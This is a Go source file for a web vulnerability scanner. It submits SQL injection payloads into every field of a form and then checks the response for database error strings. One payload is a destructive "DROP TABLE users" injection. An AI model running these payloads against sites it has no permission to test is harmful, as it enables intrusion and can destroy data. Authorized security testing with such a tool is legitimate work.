package scanner

import (
	"io"
	"net/http"
	"net/url"
	"strings"
)

var sqliPayloads = []string{
	"' OR 1=1--",
	"' UNION SELECT null--",
	"'; DROP TABLE users--",
}

var sqliIndicators = []string{
	"pg_query", "syntax error", "unterminated", "ORA-", "SQLSTATE", "Warning:", "Query failed", "You have an error in your SQL syntax",
}

func TestSQLi(form Form, baseURL string, client *http.Client) bool {
	for _, payload := range sqliPayloads {
		data := url.Values{}

		for _, input := range form.Inputs {
			data.Set(input, payload)
		}

		target := baseURL + form.Action
		var res *http.Response
		var err error

		if form.Method == "POST" {
			res, err = client.PostForm(target, data)
		} else {
			fullURL := target + "?" + data.Encode()
			res, err = client.Get(fullURL)
		}

		if err != nil {
			continue
		}
		defer res.Body.Close()

		buf := new(strings.Builder)
		io.Copy(buf, res.Body)
		body := buf.String()

		for _, indicator := range sqliIndicators {
			if strings.Contains(strings.ToLower(body), strings.ToLower(indicator)) {
				return true
			}
		}
	}
	return false
}
